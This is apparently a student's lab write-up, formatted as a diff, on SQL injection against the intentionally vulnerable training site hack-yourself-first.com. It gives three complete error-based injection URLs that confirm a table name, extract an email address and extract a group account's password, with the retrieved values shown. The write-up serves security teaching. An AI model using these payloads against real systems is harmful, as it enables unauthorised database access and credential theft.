@@ -1,0 +1,16 @@
+#1.
+Full Link: http://hack-yourself-first.com/CarsByCylinders?Cylinders=V6' AND 1=(SELECT * FROM UserProfile);--
+Valid table: UserProfile
+I knew that UserProfile had to be a possible table because when I logged onto the website and clicked on the "edit profile" under "My account," the URL showed as https://hack-yourself-first.com/Account/UserProfile/196. After that, to confirm that UserProfile was indeed a working table, I replaced the "foo" in the sample URL given in cyb-discussion on RocketChat with "UserProfile" instead. I could tell that UserProfile was a properly working table because using foo displayed an error message saying that it was an invalid object, while the error message that showed when I used UserProfile displayed something different.
+
+
+#2.
+Full Link: http://hack-yourself-first.com/CarsByCylinders?Cylinders=V6' AND 1=(SELECT TOP 1 email FROM UserProfile);--
+Single piece of data: troyhunt@hotmail.com
+The link I attached above allowed me to retrieve an email from UserProfile because the SQL command I used obtains a single email address within the UserProfile table. Because I could not display the entire table, the first single piece of data I found was an email address — troyhunt@hotmail.com.
+
+
+#3.
+Full Link: http://hack-yourself-first.com/CarsByCylinders?Cylinders=V6' AND 1=(SELECT password FROM UserProfile WHERE email='kcybergroup5@gmail.com');--
+Password of Group 5: popeyes
+In order to target group 5, I had to identify that I specifically wanted kcybergroup5@gmail.com's password and that the password would be found from the UserProfile table. Although I was able to easily find the name of the UserProfile table, I had to guess that the passwords were under "password." Generally speaking, this SQL command ensures that I am getting a specific password from UserProfile at the exact location where the email is kcybergroup5@gmail.com
